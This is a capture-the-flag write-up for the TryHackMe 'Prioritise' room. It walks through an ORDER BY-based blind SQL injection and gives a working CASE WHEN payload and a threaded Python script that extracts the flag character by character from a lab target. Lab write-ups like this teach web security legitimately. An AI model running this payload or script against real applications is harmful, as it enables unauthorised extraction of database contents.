---
title: "Prioritise - TryHackMe"
date: 2026-04-12 02:00:00 +0000
categories: [TryHackMe, Writeups]
tags: [sql-injection, blind-SQL, python-script]
image: /assets/img/writeups/covers/prioritise.png
---
# Prioritise - TryHackMe
![1.png](/assets/img/writeups/prioritise/1.png)
**Difficulty:** Easy<br>**Category:** Web Application<br>**Time Required**: 20 min

> ⚠️ **Warning:** This write-up contains the full solution. If you want to try the room yourself first, stop here and come back when you're stuck.

## Step 1: Identifying the Injection Point

The application exposes a sorting parameter:
````
http://10.113.189.57/?order=title
````
![1.png](/assets/img/writeups/prioritise/2.png)
Changing this value affects how results are displayed, confirming that user input is directly influencing the SQL query.
## Step 2: Confirming SQL Injection Behavior
![1.png](/assets/img/writeups/prioritise/3.png)
Testing of the order parameter confirmed that it is vulnerable to SQL injection. When valid values like `title` were entered, the page sorted the results as expected; however, when unusual or modified text was used, the application’s behavior changed significantly, often resulting in an error. This proves that the input is being plugged directly into the database's sorting logic, allowing an attacker to manipulate the underlying SQL query.

## Step 3: Understanding the Injection Type
This specific vulnerability is a type of **ORDER BY-based blind SQL injection**. Unlike common attacks where you might see private data or error messages on the screen, this version is **blind**, meaning the database doesn't give us any direct answers. Instead, the only way to tell it’s working is by watching how the order of the list changes. By looking at whether the items are sorted one way or another, we can figure out what is happening inside the database.
## Step 4: Exploitation Strategy
Since the database does not show results directly, we use a **guessing** strategy to pull out information one piece at a time. Here is the breakdown: 

- **Ask a "Yes/No" Question**: We inject a `CASE WHEN` statement, which works like an "if-then" rule in English.
- **Create a Visible Signal**: Because we can't see the data, we tell the database to sort the page differently based on the answer:
  - **If the answer is TRUE** → Sort the list by title (this is our "Normal" baseline).
  - **If the answer is FALSE** → Sort the list by date (this is our "Alternative" signal).
- **Infer the Data**: By looking at which way the page is sorted, we know if our guess was correct. We do this for every single character (e.g., "Is the first letter of the password 'A'?") until the full information is revealed.

<br>The payload should look like this:
````
(CASE WHEN (SELECT SUBSTRING(flag,1,1) FROM flag)="f" THEN title ELSE date END)
````
![1.png](/assets/img/writeups/prioritise/4.png)
![1.png](/assets/img/writeups/prioritise/5.png)
Increment the `(flag,1,1)` by `(flag,2,1)` after you find out the first character and so on.
## Step 5: Automation Script
The following Python script can be used to automate the extraction of the flag.<br><br>**Note**: Replace `http://10.113.189.57/?order=` on line 2 with your actual machine ip.
````
import requests, string, concurrent.futures

TARGET_URL = "http://10.113.189.57/?order="

s = requests.Session()
base = s.get(TARGET_URL + "title").text
chars = string.ascii_letters + string.digits + "{}"

flag = ""
pos = 1

def test(c):
    q = f'(CASE WHEN (SELECT SUBSTRING(flag,1,{pos}) FROM flag)="{flag+c}" THEN title ELSE date END)'
    return c if s.get(TARGET_URL + q).text == base else None

with concurrent.futures.ThreadPoolExecutor(20) as ex:
    while not flag.endswith("}"):
        for r in ex.map(test, chars):
            if r:
                flag += r
                pos += 1
                print(flag)
                break
````
The script performs the following process:

- Captures a baseline response from a normal request
- Iterates through possible characters (a-z, A-Z, 0-9, {})
- Injects each character into a SQL condition
- Compares server response with baseline
- If response matches → character is correct
- Appends correct character to the final flag
- Repeats until the full flag is reconstructed

![1.png](/assets/img/writeups/prioritise/6.png)
